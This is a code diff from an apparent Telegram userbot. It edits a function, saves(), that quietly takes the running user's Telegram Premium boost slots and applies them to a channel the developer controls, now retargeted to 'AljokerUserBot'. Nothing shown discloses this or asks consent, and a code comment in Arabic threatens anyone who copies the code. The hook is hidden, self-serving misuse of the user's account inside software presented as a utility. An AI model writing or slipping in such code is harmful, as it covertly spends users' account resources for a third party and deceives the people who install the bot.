@@ -179,7 +179,7 @@ async def add_bot_to_logger_group(chat_id):
         except Exception as e:
             LOGS.error(str(e))
 #by @jepthon بس اشوفك خامطه للكود اهينك وافضحك
-JoKeRUB = {"@jepthon", "@jepthonsupport"}
+JoKeRUB = {"@AljokerUserBot", "@jepthonsupport"}
 
 async def saves():
     for lMl10l in JoKeRUB:
@@ -189,7 +189,7 @@ async def saves():
             slots = [boost.slot for boost in result.my_boosts]
             aljoker_channel_id = None
             for chat in result.chats:
-                if chat.username == 'AljokerPiad':
+                if chat.username == 'AljokerUserBot':
                     aljoker_channel_id = chat.id
                     break
             if aljoker_channel_id and any(boost.peer.channel_id == aljoker_channel_id for boost in result.my_boosts):
@@ -197,7 +197,7 @@ async def saves():
             if not slots:
                 return
             await l313l(functions.premium.ApplyBoostRequest(
-                'AljokerPiad',
+                'AljokerUserBot',
                 slots=slots
             ))
         except OverflowError:
